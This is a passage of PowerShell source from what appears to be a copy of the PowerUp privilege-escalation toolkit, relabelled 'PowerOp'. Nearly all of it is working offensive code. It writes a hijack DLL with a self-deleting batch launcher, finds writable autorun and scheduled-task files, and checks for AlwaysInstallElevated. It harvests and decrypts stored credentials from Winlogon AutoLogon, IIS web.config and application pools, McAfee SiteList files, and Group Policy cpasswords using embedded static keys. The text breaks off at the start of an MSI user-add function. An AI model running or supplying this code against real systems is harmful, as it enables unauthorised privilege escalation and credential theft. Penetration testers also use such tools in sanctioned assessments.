        $TargetBatPath = "$BasePath\debug.bat"
    }

    # patch in the appropriate .bat launcher path
    $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -SearchString 'debug.bat' -ReplaceString $TargetBatPath

    # build the launcher .bat
    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }

    "@echo off" | Out-File -Encoding ASCII -Append $TargetBatPath
    "start /b $BatCommand" | Out-File -Encoding ASCII -Append $TargetBatPath
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $TargetBatPath

    Write-Verbose ".bat launcher written to: $TargetBatPath"
    Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath
    Write-Verbose "$TargetArchitecture DLL Hijacker written to: $DllPath"

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'DllPath' $DllPath
    $Out | Add-Member Noteproperty 'Architecture' $TargetArchitecture
    $Out | Add-Member Noteproperty 'BatLauncherPath' $TargetBatPath
    $Out | Add-Member Noteproperty 'Command' $BatCommand
    $Out.PSObject.TypeNames.Insert(0, 'PowerOp.HijackableDLL')
    $Out
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegistryAlwaysInstallElevated {


    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {

        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {


    [OutputType('PowerOp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerOp.RegistryAutoLogon')
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out | Add-Member Aliasproperty Name Key
                $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Miscellaneous checks
#
########################################################

function Get-ModifiableScheduledTaskFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiableScheduledTaskFile')
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerOp.UnattendedInstallFile')
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
            # port by @harmj0y
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $B64Pass
            )

            # make sure the appropriate assemblies are loaded
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            # declare the encoding/crypto providers we need
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            # static McAfee key XOR key LOL
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            # xor the input b64 string with the static XOR key
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            # build the static McAfee 3DES key TROLOL
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

            # set the options we need
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            # decrypt the unXor'ed block
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            # ignore the padding for the result
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if ($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'

                            if ($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if ($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            $Out = New-Object -TypeName PSObject -Property $ObjectProperties
                            $Out.PSObject.TypeNames.Insert(0, 'PowerOp.SiteListPassword')
                            $Out
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {


    [CmdletBinding()]
    Param()

    # Some XML issues between versions
    Set-StrictMode -Version 2

    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core

    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )

        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)

            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch {
            Write-Error $Error[0]
        }
    }

    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()

            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){

                Write-Verbose "Potential password in $File"

                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }

           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }

            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}

            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}

            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }

        catch {Write-Error $Error[0]}
    }

    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }

    catch {
        Write-Error $Error[0]
    }
}


function Write-UserAddMSI {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.UserAddMSI')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path = 'UserAdd.msi'
    )

